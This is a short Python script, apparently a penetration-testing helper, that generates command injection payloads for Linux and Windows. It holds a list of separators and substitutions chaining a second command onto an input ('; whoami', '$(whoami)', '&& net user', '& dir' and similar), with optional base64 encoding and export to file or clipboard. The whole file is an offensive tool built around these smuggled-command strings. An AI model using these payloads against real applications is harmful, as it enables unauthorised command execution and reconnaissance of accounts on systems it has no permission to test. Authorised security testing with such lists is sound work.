# ----------------------------------------
# Imports
# ----------------------------------------

import argparse         # For command-line flags
import base64           # For encoding payloads
import json             # For saving payloads
import pyperclip        # For copying payloads to clipboard

# ----------------------------------------
# CMDi Payloads (Linux & Windows)
# ----------------------------------------

cmd_payloads = [
    "; whoami",
    "&& whoami",
    "| whoami",
    "`whoami`",
    "$(whoami)",
    "& whoami",
    "|| whoami",
    "ping -c 1 127.0.0.1",
    "nslookup example.com",
    "&& net user",  # Windows
    "& dir"         # Windows
]

# ----------------------------------------
# Payload Modifier: Base64 Encoder
# ----------------------------------------

def encode_payload(payload, method):
    if method == "base64":
        return base64.b64encode(payload.encode()).decode()
    return payload

# ----------------------------------------
# Argument Parsing
# ----------------------------------------

parser = argparse.ArgumentParser(description="CMD Injection Payload Generator")

parser.add_argument('--cmd', action='store_true', help='Generate Command Injection payloads')
parser.add_argument('--encode', choices=['base64'], help='Encode the payloads')
parser.add_argument('--export', choices=['txt', 'json'], help='Export payloads to file')
parser.add_argument('--copy', action='store_true', help='Copy payloads to clipboard')

args = parser.parse_args()

# ----------------------------------------
# Generate Payloads
# ----------------------------------------

generated_payloads = []

if args.cmd:
    for payload in cmd_payloads:
        final_payload = payload
        if args.encode:
            final_payload = encode_payload(final_payload, args.encode)
        generated_payloads.append(final_payload)

# ----------------------------------------
# Export to File
# ----------------------------------------

if args.export == 'txt':
    with open("cmdi_payloads.txt", "w") as f:
        for payload in generated_payloads:
            f.write(payload + "\n")
    print("[✔] Payloads saved to cmdi_payloads.txt")

elif args.export == 'json':
    with open("cmdi_payloads.json", "w") as f:
        json.dump(generated_payloads, f, indent=4)
    print("[✔] Payloads saved to cmdi_payloads.json")

# ----------------------------------------
# Copy to Clipboard
# ----------------------------------------

if args.copy:
    pyperclip.copy('\n'.join(generated_payloads))
    print("[✔] Payloads copied to clipboard")

# ----------------------------------------
# Print to Terminal (default)
# ----------------------------------------

if not args.export and not args.copy:
    for payload in generated_payloads:
        print(payload)
